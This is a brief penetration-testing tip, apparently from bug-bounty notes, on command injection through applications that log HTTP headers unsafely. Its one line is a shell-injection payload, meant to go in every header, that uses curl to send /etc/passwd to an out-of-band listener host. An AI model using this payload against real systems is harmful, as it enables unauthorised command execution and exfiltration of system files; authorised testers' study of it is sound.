### unsafe logger
If an unsafe logger is used, an attacker can inject code and execute arbitrary commands, 
even if the page being accessed is a 404 page. 
Always test HTTP request headers to make sure the application is handling the headers correctly.
Try it in every possible header
`";curl -X POST -d @/etc/passwd http://burp_collobrator.com/ #`

![Fk-Xm9zakAEItYU](https://user-images.githubusercontent.com/91581651/210128119-5a9745d7-c2ec-494f-9fdc-16f03b7125f5.png)
